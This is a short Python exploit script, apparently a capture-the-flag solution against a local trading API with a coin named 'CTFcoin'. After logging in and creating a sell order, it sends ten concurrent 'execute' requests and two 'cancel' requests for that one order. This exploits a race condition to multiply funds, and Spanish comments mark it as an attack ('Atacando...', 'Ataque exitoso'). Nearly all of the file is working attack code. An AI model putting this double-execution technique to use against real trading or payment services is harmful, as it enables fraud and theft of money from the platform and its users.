import requests, time, sys
from concurrent.futures import ThreadPoolExecutor

URL = "http://localhost:8080/api"

def run(user, password):
    # 1. Login
    res = requests.post(f"{URL}/auth/login", json={"username": user, "password": password})
    if res.status_code != 200: return print("Login failed")
    headers = {"Authorization": f"Bearer {res.json()['access_token']}"}

    print("Atacando...")

    # 2. Exploit (Una sola vez)
    # Create Sell Order
    r = requests.post(f"{URL}/trading/create-order", headers=headers, json={
        "coin": "CTFcoin", "amount": 10.0, "order_type": "SELL", 
        "price_type": "limit", "target_price": 1000.0
    })
    
    if r.status_code in [200, 201]:
        oid = r.json()["order"]["id"]

        # Race Condition: Execute vs Cancel
        with ThreadPoolExecutor(max_workers=12) as pool:
            # Launch 10 executes (to multiply money) and 2 cancels (to confuse state)
            for _ in range(10): pool.submit(requests.post, f"{URL}/trading/execute-order/{oid}", headers=headers)
            for _ in range(2): pool.submit(requests.post, f"{URL}/trading/cancel-order/{oid}", headers=headers)
        time.sleep(0.1)

    print("Ataque exitoso")

if __name__ == "__main__":
    user = input("User: ")
    password = input("Password: ")
    run(user, password)